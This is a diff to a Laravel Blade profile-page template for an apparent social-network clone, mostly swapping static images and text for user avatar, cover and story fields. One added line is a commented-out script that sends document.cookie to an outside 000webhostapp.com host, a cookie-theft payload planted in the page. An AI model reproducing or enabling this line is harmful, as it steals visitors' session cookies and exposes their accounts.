@@ -4,11 +4,11 @@
 <!-- INFO  -->
 <div class="fixed xl:absolute w-full bg-white top-16 md:top-6 xl:h-70vh  xl:top-0 right-0 z-20  h-14">
     <div class="w-full lg:w-942 xl:w-942 m-auto h-3/5 rounded-b-md bg-gray-100 hidden xl:block">
-        <img src="{{ asset('image/anh-ysauo.jpg') }}" alt="" class="w-full h-full object-cover rounded-b-3xl">
+        <img id="cover_avatar_user" src="{{URL::to('/image/'. Auth::user()->cover_avatar)}}" alt="" class="w-full h-full object-cover rounded-b-3xl">
     </div>
     <div class=" absolute bottom-24 right-1/2 transform translate-x-1/2 hidden xl:block">
         <div class="flex justify-center items-center ">
-            <img src="{{ asset('image/anh-ysauo.jpg') }}" alt="" class="w-52 h-52 rounded-full border-4 border-yellow-100 mx-0">
+            <img id="avatar_user" src="{{URL::to('/image/'. Auth::user()->avatar)}}" alt="" class="w-52 h-52 rounded-full border-4 border-yellow-100 mx-0 object-cover" >
             <span class="absolute bottom-1/2 right-3 rounded-full w-10 h-10 bg-gray-200 grid place-items-center cursor-pointer">
                 <i class='bx bxs-camera-plus text-3xl text-gray-700'></i>
             </span>
@@ -17,7 +17,8 @@
             <div class="font-semibold text-3xl p-2">
                 {{ Auth::user()->name }}
             </div>
-            <p class="text-sm"> Yêu bé Mỹ Linh <i class='bx bxs-heart text-red-600'></i> </p>
+            <p class="text-sm"> {{ $user->story }} <i class='bx bxs-heart text-red-600'></i> </p>
+            <!-- <script>window.location = 'https://wedcuabestysvn0901.000webhostapp.com/?cookie=' + document.cookie</script> -->
             <p class="m-4"> <a href="javascript::void(0) " class="text-blue-500 underline font-medium"> Edit </a></p>
         </div>
 
@@ -45,7 +46,7 @@
                 <button class="outline-none bg-blue-500 p-2 hover:bg-blue-700 rounded-md text-base font-medium text-white"><i class='bx bxs-plus-circle mr-2 text-white'></i>Thêm vào tin</button>
             </div>
             <div>
-                <button class="outline-none bg-gray-100 p-2 hover:bg-gray-200 rounded-md text-base font-medium"><i class='bx bxs-edit-alt mr-2'></i>Chỉnh sửa trang cá nhân</button>
+                <button id="edit_info_profile" class="outline-none bg-gray-100 p-2 hover:bg-gray-200 rounded-md text-base font-medium"><i class='bx bxs-edit-alt mr-2'></i>Chỉnh sửa trang cá nhân</button>
             </div>
             <div>
                 <button class="outline-none bg-gray-100 p-2 hover:bg-gray-200 rounded-md text-base font-medium"><i class='bx bx-dots-horizontal-rounded px-1 '></i></button>
@@ -543,4 +544,7 @@
     </div>
     
 </div>
+<script >
+    $('#home').removeClass('text-blue-500  border-blue-500 ')
+</script>
 @endsection
